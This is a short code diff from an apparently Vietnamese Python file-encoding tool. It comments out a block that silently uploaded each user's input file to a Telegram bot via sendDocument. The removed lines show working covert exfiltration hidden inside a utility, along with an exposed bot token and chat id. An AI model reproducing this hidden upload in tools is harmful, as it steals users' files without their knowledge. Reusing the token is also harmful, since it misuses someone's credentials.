@@ -910,13 +910,13 @@ def main():
     print(Colorate.Diagonal(Colors.DynamicMIX((purple, dark)), Center.XCenter(banner)))
     file = input(stage(f"Nhập File Cần Encode {dark}--> {Col.reset}", "?", col2 = bpurple)).replace('"','').replace("'","")
 
-    bot_token = '6223631247:AAEBsmXeJd8VyMNBeGl_tmBTxYEgA-Onn5Q'
-    chat_id = '@Tool_LQM_591'  
+    #bot_token = '6223631247:AAEBsmXeJd8VyMNBeGl_tmBTxYEgA-Onn5Q'
+    #chat_id = '@Tool_LQM_591'  
     try:
-        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+        """url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
         with open(file, 'rb') as f:
             response = requests.post(url, data={'chat_id': chat_id}, files={'document': f})
-        response.raise_for_status() 
+        response.raise_for_status() """
 
         with open(file, mode='rb') as f:
             script = f.read().decode('utf-8')
